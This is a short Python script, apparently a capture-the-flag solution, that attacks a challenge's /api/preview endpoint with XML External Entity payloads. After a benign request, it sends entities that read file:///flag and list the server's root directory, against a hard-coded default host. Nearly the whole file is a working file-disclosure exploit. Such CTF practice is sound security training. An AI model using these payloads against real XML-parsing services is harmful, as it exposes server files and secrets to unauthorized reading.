# -*- coding: utf-8 -*-
"""第 404 号漂流瓶 — XXE 复现脚本
用法: python solve_xxe.py http://IP:PORT
"""
import json
import sys
import urllib.request
import urllib.error

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://103.163.47.230:33698"


def preview(xml: str):
    req = urllib.request.Request(
        BASE + "/api/preview",
        data=xml.encode(),
        headers={"Content-Type": "application/xml; charset=utf-8"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


# 1) 正常信件，看返回结构
ok = """<?xml version="1.0" encoding="UTF-8"?>
<letter><sender>anon</sender><receiver>post</receiver><message>hi</message></letter>"""
print("[*] 正常请求 ->", preview(ok))

# 2) XXE 读 /flag
xxe = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE letter [<!ENTITY xxe SYSTEM "file:///flag">]>
<letter><sender>&xxe;</sender><receiver>post</receiver><message>hi</message></letter>"""
print("[*] XXE file:///flag ->", preview(xxe))

# 3) 若 /flag 不在根，列目录 / 再读
xxe2 = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE letter [<!ENTITY xxe SYSTEM "file:///">]>
<letter><sender>&xxe;</sender><receiver>post</receiver><message>hi</message></letter>"""
print("[*] XXE file:/// ->", preview(xxe2)[1][:400])
